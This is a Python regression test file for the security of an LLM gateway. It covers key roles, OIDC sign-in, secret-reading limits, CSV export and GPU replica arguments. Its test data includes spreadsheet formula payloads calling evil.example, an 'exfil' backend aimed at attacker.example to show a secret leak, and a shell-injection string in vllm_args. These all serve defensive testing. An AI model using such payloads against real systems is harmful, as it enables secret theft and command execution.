"""Security regressions: who a key acts as, what each role sees, and what a console-saved configuration, a backend or a
GPU replica's arguments can reach. Each test is a bug that was fixed (see CHANGELOG)."""

from __future__ import annotations

import asyncio
import logging
import shlex
import subprocess

import httpx
import pytest
from conftest import ADMIN_KEY, LEAD_KEY, TEST_KEY, auth, ledger_row
from test_oidc import idp, oidc_cfg, token  # noqa: F401 (fixtures)

from meritorder import replica_gate
from meritorder.auth import AuthError, Authenticator, lower_role
from meritorder.backends.auth import BackendAuthProvider
from meritorder.backends.base import BackendError
from meritorder.backends.http import OpenAIBackend, capped
from meritorder.config import BackendAuth, BackendConfig, Config, ModelConfig, Route, ServeConfig
from meritorder.configstore import parse_and_validate, secret_problems
from meritorder.reports import csv_cell
from meritorder.sessions import session_id
from meritorder.skypilot import Fleet, Identity, SkyPilotProvisioner, tunnel_bind

IDENT = Identity("ab12", "test-secret")


@pytest.fixture
def durable(gateway):
    kind = gateway.store.kind
    gateway.store.kind = "postgres"
    yield gateway
    gateway.store.kind = kind


# ------------------------------------------------------------------ who a key acts as


def test_lower_role_takes_the_lower_rank():
    assert lower_role("admin", "user") == lower_role("user", "admin") == "user"
    assert lower_role("finance", "team_lead") == "team_lead" and lower_role("admin", "admin") == "admin"


async def test_a_key_a_lead_minted_stays_a_user_key_when_its_person_signs_in_as_admin(idp, oidc_cfg, client, durable):
    """A lead mints a `user` key for someone who hasn't signed in yet (Entra object IDs are readable by every member of the
    tenant). When that person signs in and the mappings make them an admin, the lead's copy still acts as a user."""
    durable.cfg.auth.oidc = oidc_cfg
    durable.authn = Authenticator(durable.cfg, durable.store)
    r = await client.post("/v1/admin/keys", json={"user": "oid-boss", "role": "user"}, headers=auth(LEAD_KEY))
    assert r.status_code == 201 and r.json()["role"] == "user", r.text
    leads_copy = r.json()["api_key"]
    r = await client.post("/auth/exchange", json={"id_token": token({"oid": "oid-boss", "groups": ["g-admins"]})})
    assert r.status_code == 200, r.text
    assert (await durable.store.get_user("oid-boss"))["role"] == "admin"
    durable.authn.forget_user("oid-boss")
    p = await durable.authn.authenticate(auth(leads_copy))
    assert (p.user_id, p.role) == ("oid-boss", "user")
    assert (await client.get("/v1/admin/config", headers=auth(leads_copy))).status_code == 403
    # Their own sign-in key acts as admin; the Keys page says which keys their record outranks.
    assert (await durable.authn.authenticate(auth(r.json()["api_key"]))).role == "admin"
    keys = (await client.get("/v1/admin/keys", headers=auth(ADMIN_KEY), params={"user": "oid-boss"})).json()["keys"]
    assert sorted((k["role"], k["user_role"], k["acts_as"]) for k in keys) == [("admin", "admin", "admin"), ("user", "admin", "user")]


async def test_a_sign_in_key_takes_the_role_an_admin_pinned(idp, oidc_cfg, client, durable):
    durable.cfg.auth.oidc = oidc_cfg
    durable.authn = Authenticator(durable.cfg, durable.store)
    await durable.store.upsert_user("oid-alice", "eng", "user")
    await durable.store.update_user("oid-alice", role="team_lead")  # pinned: the mappings say user
    r = await client.post("/auth/exchange", json={"id_token": token()})
    assert r.status_code == 200
    assert (await durable.authn.authenticate(auth(r.json()["api_key"]))).role == "team_lead"


async def test_disabling_a_static_key_person_on_the_people_page_refuses_their_key(client, durable):
    """Disabling someone takes effect within a minute on every key they have, a static one from the config file too."""
    await durable.store.upsert_user("alice", "default", "user", email="alice@example.com")
    r = await client.patch("/v1/admin/users/alice", json={"disabled": True}, headers=auth(ADMIN_KEY))
    assert r.status_code == 200 and r.json()["disabled"] is True, r.text
    with pytest.raises(AuthError) as e:
        await durable.authn.authenticate(auth(TEST_KEY))
    assert e.value.status == 401
    assert (await client.get("/v1/reports/me", headers=auth(TEST_KEY))).status_code == 401
    await client.patch("/v1/admin/users/alice", json={"disabled": False}, headers=auth(ADMIN_KEY))
    assert (await client.get("/v1/reports/me", headers=auth(TEST_KEY))).status_code == 200


async def test_moving_a_static_key_person_moves_their_key_and_can_only_lower_its_role(client, durable):
    await durable.store.upsert_user("lee", "default", "team_lead")
    await durable.store.update_user("lee", team="ops", role="user")
    durable.authn.forget_user("lee")
    p = await durable.authn.authenticate(auth(LEAD_KEY))
    assert (p.team, p.role) == ("ops", "user")
    await durable.store.update_user("lee", role="admin")  # the file says team_lead: the record can't raise it
    durable.authn.forget_user("lee")
    assert (await durable.authn.authenticate(auth(LEAD_KEY))).role == "team_lead"


async def test_a_static_key_still_works_when_the_database_doesnt(client, gateway, monkeypatch):
    async def broken(user_id):
        raise ConnectionError("database down")

    monkeypatch.setattr(gateway.store, "get_user", broken)
    gateway.authn.forget_user("alice")
    p = await gateway.authn.authenticate(auth(TEST_KEY))
    assert (p.user_id, p.team, p.role) == ("alice", "default", "user")


async def test_a_disabled_person_cannot_sign_in_or_get_a_key(idp, oidc_cfg, client, gateway):
    gateway.cfg.auth.oidc = oidc_cfg
    gateway.authn = Authenticator(gateway.cfg, gateway.store)
    await gateway.store.upsert_user("oid-alice", "eng", "user")
    await gateway.store.update_user("oid-alice", disabled=True)
    r = await client.post("/auth/exchange", json={"id_token": token()})
    assert r.status_code == 403 and "disabled" in r.text
    assert not await gateway.store.list_keys(user_id="oid-alice")


def test_entra_group_overage_is_logged(oidc_cfg, caplog):
    from meritorder.auth import OIDCVerifier

    claims = {"oid": "oid-many", "sub": "s", "_claim_names": {"groups": "src1"}, "_claim_sources": {"src1": {"endpoint": "x"}}}
    with caplog.at_level(logging.WARNING, logger="meritorder.auth"):
        p, _, _ = OIDCVerifier(oidc_cfg).principal(claims)
    assert p.team == "default" and "group overage" in caplog.text


# ------------------------------------------------------------------ what each role may do and see


async def test_finance_gets_no_per_request_feed(client, gateway):
    """Docs: finance sees every team in aggregate, with no per-request rows; the feed is per-request rows."""
    _, fin = await gateway.store.create_key("fin", "ops", "finance")
    gateway.observe(ledger_row(user_id="alice", team="default", actual_cost=0.42))
    await gateway.drain()
    assert (await client.get("/v1/reports/requests", headers=auth(fin))).status_code == 403
    assert (await client.get("/v1/console/feed", headers=auth(fin))).status_code == 403
    events = (await client.get("/v1/console/feed", headers=auth(ADMIN_KEY))).json()["events"]
    assert any(e.get("user") == "alice" for e in events)


async def test_a_lead_revokes_only_their_teams_user_keys_and_their_own(client, durable):
    store = durable.store
    await store.upsert_user("boss", "default", "admin")
    await store.upsert_user("dana", "default", "team_lead")
    await store.upsert_user("erin", "default", "user")
    await store.upsert_user("finn", "ops", "user")
    boss, _ = await store.create_key("boss", "default", "admin")
    dana, _ = await store.create_key("dana", "default", "team_lead")
    erin, _ = await store.create_key("erin", "default", "user")
    finn, _ = await store.create_key("finn", "ops", "user")
    own, _ = await store.create_key("lee", "default", "team_lead")
    for key_id in (boss, dana, finn):
        assert (await client.delete(f"/v1/admin/keys/{key_id}", headers=auth(LEAD_KEY))).status_code == 403, key_id
    for key_id in (erin, own):
        r = await client.delete(f"/v1/admin/keys/{key_id}", headers=auth(LEAD_KEY))
        assert r.status_code == 200 and r.json()["revoked"], key_id
    assert (await client.delete(f"/v1/admin/keys/{boss}", headers=auth(ADMIN_KEY))).json()["revoked"]


async def test_only_an_admin_mints_a_key_that_never_expires(client, durable):
    r = await client.post("/v1/admin/keys", json={"user": "zed", "expires_days": None}, headers=auth(LEAD_KEY))
    assert r.status_code == 403 and "never expires" in r.text
    r = await client.post("/v1/admin/keys", json={"user": "zed", "expires_days": None}, headers=auth(ADMIN_KEY))
    assert r.status_code == 201 and r.json()["expires_at"] is None


async def test_leads_dont_see_where_the_sealing_key_is_kept(client, gateway):
    gateway.cfg.response_store.key_file = "/run/secrets/meritorder/MERITORDER_RESPONSES_KEY"
    lead = (await client.get("/v1/console/teams", headers=auth(LEAD_KEY))).json()["stored_key"]
    admin = (await client.get("/v1/console/teams", headers=auth(ADMIN_KEY))).json()["stored_key"]
    assert lead["file"] is None and lead["env"] is None
    assert admin["file"] == "/run/secrets/meritorder/MERITORDER_RESPONSES_KEY" and admin["env"] == "MERITORDER_RESPONSES_KEY"


def test_batch_links_ignore_forwarded_headers_a_client_sends():
    from starlette.requests import Request

    from meritorder.batches.api import base_url

    scope = {"type": "http", "scheme": "http", "server": ("gw.internal", 8080), "path": "/", "root_path": "", "query_string": b"",
             "headers": [(b"host", b"gw.internal:8080"), (b"x-forwarded-host", b"evil.example"), (b"x-forwarded-proto", b"https")]}
    assert base_url(Request(scope)) == "http://gw.internal:8080"


# ------------------------------------------------------------------ CSVs


def test_csv_cells_that_would_start_a_formula_are_quoted():
    for v in ("=1+1", "+cmd", "-2+3", "@SUM(A1)", "\tx", "\rx"):
        assert csv_cell(v) == "'" + v
    assert csv_cell("claude-opus") == "claude-opus" and csv_cell(-0.5) == -0.5 and csv_cell(None) is None


def test_session_ids_from_headers_keep_to_a_safe_alphabet():
    sid, source = session_id({"x-meritorder-session": '=HYPERLINK("http://evil.example/"&A1,"x")'}, {}, "openai", "alice")
    assert source == "header" and sid == "_HYPERLINK__http://evil.example/__A1__x__"
    assert session_id({"session-id": "0b9c-4f1e:run.1"}, {}, "openai", "alice")[0] == "0b9c-4f1e:run.1"


async def test_requests_csv_hands_a_spreadsheet_no_formula(client, gateway):
    payload = '=HYPERLINK("http://evil.example/"&A1,"click")'
    r = await client.post("/v1/chat/completions", json={"model": "small", "messages": [{"role": "user", "content": "hi"}]},
                          headers={**auth(TEST_KEY), "x-meritorder-session": payload})
    assert r.status_code == 200, r.text
    await gateway.drain()
    await gateway.store.record(ledger_row(user_id="alice", team="default", requested_model="=cmd|' /C calc'!A0"))
    csv_text = (await client.get("/v1/reports/requests.csv", headers=auth(ADMIN_KEY))).text
    assert "HYPERLINK" in csv_text and "'=cmd" in csv_text
    cells = [c.lstrip('"') for line in csv_text.splitlines() for c in line.split(",")]
    assert not any(c.startswith(("=", "+", "@")) for c in cells)


# ------------------------------------------------------------------ console-saved configuration: secrets


def backend_doc(**auth_fields) -> dict:
    return {"backends": {"exfil": {"kind": "api", "format": "openai", "base_url": "https://attacker.example/v1", "auth": auth_fields}}}


def test_a_saved_backend_cannot_read_the_gateways_own_secrets(monkeypatch):
    """auth.value_env may name only a provider's key or MERITORDER_BACKEND_*: the backend sends what it reads to its
    base_url, which the same admin chooses, so the database URL would walk out."""
    monkeypatch.setenv("MERITORDER_DATABASE_URL", "postgresql://meritorder:S3cret@postgres:5432/meritorder")
    for name in ("MERITORDER_DATABASE_URL", "MERITORDER_SCIM_TOKEN", "MERITORDER_RESPONSES_KEY", "HOME"):
        assert secret_problems(backend_doc(value_env=name)), name
        assert secret_problems(backend_doc(value=f"${{{name}}}")), name
    for name in ("OPENROUTER_API_KEY", "MERITORDER_BACKEND_LOCAL"):
        assert secret_problems(backend_doc(value_env=name)) == [], name
    # The operator can widen it; the gateway's own secrets stay with the fields that use them.
    monkeypatch.setenv("MERITORDER_CONFIG_SECRET_ENVS", "CORP_LLM_KEY, VAULT_*")
    assert secret_problems(backend_doc(value_env="CORP_LLM_KEY")) == secret_problems(backend_doc(value_env="VAULT_X")) == []
    assert secret_problems({"response_store": {"key_env": "MERITORDER_RESPONSES_KEY"}}) == []
    assert secret_problems({"reporting": {"clickhouse": {"auth": {"value_env": "MERITORDER_DATABASE_URL"}}}})
    # The YAML file on disk is the operator's and isn't checked: what the backend would send.
    assert BackendAuth(value_env="MERITORDER_DATABASE_URL").key().startswith("postgresql://")


def test_a_saved_backend_reads_files_only_from_the_secrets_directory(monkeypatch, tmp_path):
    secrets = tmp_path / "secrets"
    secrets.mkdir()
    (secrets / "OPENAI_API_KEY").write_text("sk-1")
    (secrets / "MERITORDER_SCIM_TOKEN").write_text("very-secret")
    (tmp_path / "environ").write_text("MERITORDER_SCIM_TOKEN=very-secret")
    (secrets / "MERITORDER_BACKEND_LINK").symlink_to(tmp_path / "environ")
    monkeypatch.setenv("MERITORDER_SECRETS_DIR", str(secrets))
    assert secret_problems(backend_doc(value_file=str(secrets / "OPENAI_API_KEY"))) == []
    assert "outside" in secret_problems(backend_doc(value_file=str(tmp_path / "environ")))[0]
    assert "outside" in secret_problems(backend_doc(value_file=str(secrets / "MERITORDER_BACKEND_LINK")))[0]  # symlink resolved
    assert ".." in secret_problems(backend_doc(value_file=f"{secrets}/../secrets/OPENAI_API_KEY"))[0]
    assert "may not read" in secret_problems(backend_doc(value_file=str(secrets / "MERITORDER_SCIM_TOKEN")))[0]
    assert secret_problems(backend_doc(value_file="relative/OPENAI_API_KEY"))


def test_dollar_references_outside_secret_fields_are_limited_to_the_shipped_ones(monkeypatch):
    """${NAME} is expanded anywhere and some expanded fields are shown to admins (base_url): a webhook URL is a credential."""
    doc = {"backends": {"peek": {"kind": "api", "format": "openai", "base_url": "${MERITORDER_ALERT_WEBHOOK_URL}",
                                 "auth": {"value_env": "OPENAI_API_KEY"}}}}
    assert "outside a secret field" in secret_problems(doc)[0]
    doc["backends"]["peek"]["base_url"] = "https://${AZURE_OPENAI_ENDPOINT:-x.test}/v1"
    assert secret_problems(doc) == []
    doc["backends"]["peek"]["base_url"] = "${CORP_GATEWAY_URL}"
    assert secret_problems(doc)
    monkeypatch.setenv("MERITORDER_CONFIG_ENVS", "CORP_GATEWAY_URL")
    assert secret_problems(doc) == []


def test_the_shipped_config_saves_from_the_console():
    from pathlib import Path

    from meritorder.config import load_raw_config

    path = Path(__file__).parent.parent / "config" / "meritorder.yaml"
    assert secret_problems(load_raw_config(path)) == []


async def test_restoring_an_old_version_follows_todays_secret_rules(client, durable, monkeypatch):
    import copy

    from conftest import TEST_CONFIG

    doc = copy.deepcopy(TEST_CONFIG)
    doc["backends"]["mock-openai"]["auth"] = {"type": "api_key", "value_env": "MERITORDER_DATABASE_URL"}
    vid = await durable.store.save_config(doc, "root", "saved before the rule")
    r = await client.post(f"/v1/admin/config/versions/{vid}/restore", headers=auth(ADMIN_KEY))
    assert r.status_code == 422 and "MERITORDER_DATABASE_URL" in r.text
    with pytest.raises(Exception):
        parse_and_validate(None, ".", None, document=doc)


# ------------------------------------------------------------------ vLLM arguments


def sky_config(name: str = "gpu", **serve) -> Config:
    model = ModelConfig(name="ow", quality={"coding": 4}, hf_id="o/m", routes=[Route(backend=name, model="m")])
    backend = BackendConfig(name=name, kind="self_hosted", format="openai", gpu_cost_per_hour=2.0,
                            serve=ServeConfig(model="ow", provisioner="skypilot", accelerators="A10:1", **serve))
    return Config(backends=[backend], models=[model])


@pytest.mark.parametrize("spelled", ['--max-model-len 8192 --enable-log-req""uests', "--enable_log_requests", "--enable-log-req",
                                     "--enable-log-outputs=true", "'--enable-log-requests'"])
def test_vllm_args_cannot_turn_on_request_logging_however_spelled(spelled):
    with pytest.raises(ValueError, match="request logging"):
        ServeConfig(model="ow", provisioner="skypilot", accelerators="A10:1", vllm_args=spelled)


def test_vllm_args_must_parse_as_arguments():
    with pytest.raises(ValueError, match="valid argument list"):
        ServeConfig(model="ow", provisioner="skypilot", accelerators="A10:1", vllm_args="--x 'unclosed")
    assert ServeConfig(model="ow", provisioner="skypilot", accelerators="A10:1", vllm_args="--enable-log-stats").vllm_args


def test_vllm_args_are_arguments_not_shell_on_skypilot(tmp_path):
    marker = tmp_path / "pwned"
    cfg = sky_config(vllm_args=f"--max-model-len $(touch {marker}; echo 8192) --served-model-name 'a b'")
    prov = SkyPilotProvisioner(cfg.backends[0], cfg, Fleet(IDENT))
    task = prov.task_config(prov.cluster(1))
    # Run the task's script with a stand-in python3 that writes down its arguments.
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    args_file = tmp_path / "args"
    (fake_bin / "python3").write_text(f'#!/bin/sh\nfor a in "$@"; do printf "%s\\n" "$a"; done > {args_file}\n')
    (fake_bin / "python3").chmod(0o755)
    script = task["run"].replace("/tmp/meritorder_gate.py", str(tmp_path / "gate.py"))
    subprocess.run(["bash", "-c", script], check=False, env={"PATH": f"{fake_bin}:/usr/bin:/bin"})
    assert not marker.exists(), "vllm_args ran as shell on the replica"
    got = args_file.read_text().splitlines()  # vLLM gets the tokens as written: text, not commands
    assert got[-7:] == shlex.split(cfg.backends[0].serve.vllm_args) == ["--max-model-len", "$(touch", f"{marker};", "echo", "8192)",
                                                                        "--served-model-name", "a b"]


async def test_tunnels_listen_only_where_gateways_reach_them(monkeypatch):
    monkeypatch.delenv("MERITORDER_TUNNEL_BIND", raising=False)
    assert await tunnel_bind("localhost") == "127.0.0.1"
    monkeypatch.setattr("socket.gethostbyname", lambda host: {"controller": "172.18.0.5"}[host])
    assert await tunnel_bind("controller") == "172.18.0.5"

    def unknown(host):
        raise OSError("no such host")

    monkeypatch.setattr("socket.gethostbyname", unknown)
    assert await tunnel_bind("nowhere") == "0.0.0.0"
    monkeypatch.setenv("MERITORDER_TUNNEL_BIND", "10.0.0.2")
    assert await tunnel_bind("nowhere") == "10.0.0.2"


# ------------------------------------------------------------------ the replica gate and backends' answers


async def test_the_replica_gate_closes_connections_past_its_unverified_cap():
    gate = replica_gate.Gate(["true"], "0" * 64, 60, 1, 2, gpu=lambda: {}, times=lambda: {})
    assert replica_gate.HEAD_TIMEOUT <= 5
    gate.unverified = asyncio.Semaphore(0)  # every slot taken by connections yet to show the key

    class Writer:
        closed = False
        written = b""

        def write(self, data):
            self.written += data

        async def drain(self):
            pass

        def close(self):
            self.closed = True

    reader = asyncio.StreamReader()
    reader.feed_data(b"GET /meritorder/status HTTP/1.1\r\n\r\n")
    w = Writer()
    await asyncio.wait_for(gate.handle(reader, w), 1)
    assert w.closed and w.written == b""


async def test_a_backends_answer_is_capped(monkeypatch):
    monkeypatch.setattr("meritorder.backends.http.MAX_RESPONSE_BYTES", 1000)
    cfg = BackendConfig(name="big", format="openai", base_url="https://x.test/v1")
    b = OpenAIBackend(cfg, BackendAuthProvider())
    b.client = httpx.AsyncClient(transport=httpx.MockTransport(lambda r: httpx.Response(200, content=b'{"x": "' + b"a" * 5000 + b'"}')))
    with pytest.raises(BackendError) as e:
        await b._post("https://x.test/v1/chat/completions", {"model": "m"}, {}, stream=False)
    assert e.value.status == 502 and "over 1,000 bytes" in str(e.value)

    async def endless():
        while True:
            yield b"data: " + b"a" * 100
            await asyncio.sleep(0)

    with pytest.raises(httpx.ReadError):
        async for _ in capped(endless(), "big", limit=10_000):
            pass
